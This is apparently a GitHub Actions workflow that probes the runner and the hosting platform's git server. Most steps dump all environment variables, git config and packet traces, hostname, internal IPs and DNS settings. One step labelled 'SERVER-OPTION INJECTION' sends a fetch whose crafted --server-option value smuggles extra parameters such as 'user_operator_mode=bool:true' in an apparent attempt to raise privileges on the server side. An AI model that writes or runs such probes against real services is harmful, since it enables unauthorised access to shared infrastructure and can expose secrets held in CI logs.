name: Inspect Environment
on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      server_option:
        description: 'Server option to test'
        required: false
        default: ''

jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Log all env vars
        run: |
          echo "=== ALL ENVIRONMENT VARIABLES ==="
          env | sort
          echo "=== END ENV ==="
          
      - name: Log runner context
        run: |
          echo "=== RUNNER INFO ==="
          echo "Runner OS: $RUNNER_OS"
          echo "Runner Arch: $RUNNER_ARCH"
          echo "Runner Name: $RUNNER_NAME"
          echo "GITHUB_SERVER_URL: $GITHUB_SERVER_URL"
          echo "GITHUB_API_URL: $GITHUB_API_URL"
          echo "GITHUB_GRAPHQL_URL: $GITHUB_GRAPHQL_URL"
          echo "=== END RUNNER ==="
          
      - name: Checkout with trace
        uses: actions/checkout@v4
        env:
          GIT_TRACE: 1
          GIT_TRACE_PACKET: 1
          GIT_CURL_VERBOSE: 1
          
      - name: Inspect git config after checkout
        run: |
          echo "=== GIT CONFIG ==="
          git config --list --show-origin
          echo "=== GIT REMOTE ==="
          git remote -v
          echo "=== GIT PROTOCOL VERSION ==="
          git config protocol.version || echo "not set"
          echo "=== GIT LOG ==="
          git log --oneline -5

      - name: Fetch with custom server-option
        run: |
          echo "=== FETCH WITH SERVER-OPTION INJECTION ==="
          GIT_TRACE=1 GIT_TRACE_PACKET=1 git -c protocol.version=2 fetch \
            --server-option="x;rails_env=test;user_operator_mode=bool:true" \
            origin main 2>&1 || true
          echo "=== END FETCH ==="
          
      - name: Check network environment
        run: |
          echo "=== Hostname ==="
          hostname
          echo "=== Internal IPs ==="
          ip addr 2>/dev/null || ifconfig 2>/dev/null || true
          echo "=== DNS servers ==="
          cat /etc/resolv.conf 2>/dev/null || true
